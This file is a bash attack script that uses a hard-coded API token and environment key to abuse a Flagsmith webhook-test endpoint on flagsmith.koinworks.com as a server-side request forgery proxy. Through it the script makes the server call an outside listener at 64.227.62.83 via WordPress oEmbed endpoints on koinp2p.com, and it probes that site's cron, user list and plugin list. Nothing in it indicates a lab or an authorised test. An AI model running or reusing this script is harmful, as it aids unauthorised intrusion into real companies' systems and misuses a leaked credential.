#!/bin/bash
UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
KEY="5c835df901f2674a0788e25484a73eb42be31713"
EKEY="8uLGCkxcX7sfS5GDFvy3Ah"

SSRF() {
  curl -s -X POST "https://flagsmith.koinworks.com/api/v1/environments/${EKEY}/webhooks/test/" \
    -H "Authorization: Token $KEY" -H "Content-Type: application/json" \
    -H "User-Agent: $UA" -H "Accept: application/json" \
    -H "Referer: https://flagsmith.koinworks.com/" \
    -d "{\"url\":\"$1\"}" --max-time 25 2>/dev/null || echo "TIMEOUT"
}

echo "IP: $(curl -s https://ifconfig.me)"

# Test 1: WP oEmbed SSRF (parse-embed fetches URL server-side)
echo "=== OEMBED SSRF TO VPS ==="
SSRF "https://koinp2p.com/wp-admin/admin-ajax.php?action=parse-embed&post=1&shortcode=%5Bembed%5Dhttp%3A%2F%2F64.227.62.83%3A8888%2Foembed-ssrf%5B%2Fembed%5D"
echo ""

# Test 2: WP REST API oembed proxy  
echo "=== REST OEMBED ==="
SSRF "https://koinp2p.com/wp-json/oembed/1.0/proxy?url=http%3A%2F%2F64.227.62.83%3A8888%2Frest-oembed"
echo ""

# Test 3: WP oEmbed discover (fetches URL to find oembed endpoint)
echo "=== OEMBED DISCOVER ==="
SSRF "https://koinp2p.com/wp-admin/admin-ajax.php?action=parse-embed&url=http%3A%2F%2F64.227.62.83%3A8888%2Foembed-discover"
echo ""

# Test 4: Direct admin-ajax SSRF actions
echo "=== WP CRON ==="
SSRF "https://koinp2p.com/wp-cron.php?doing_wp_cron=1"
echo ""

# Test 5: wp-json users (info disclosure)
echo "=== WP USERS ==="
SSRF "https://koinp2p.com/wp-json/wp/v2/users"
echo ""

# Test 6: wp-json plugins (if accessible)
echo "=== WP PLUGINS ==="
SSRF "https://koinp2p.com/wp-json/wp/v2/plugins"
echo ""
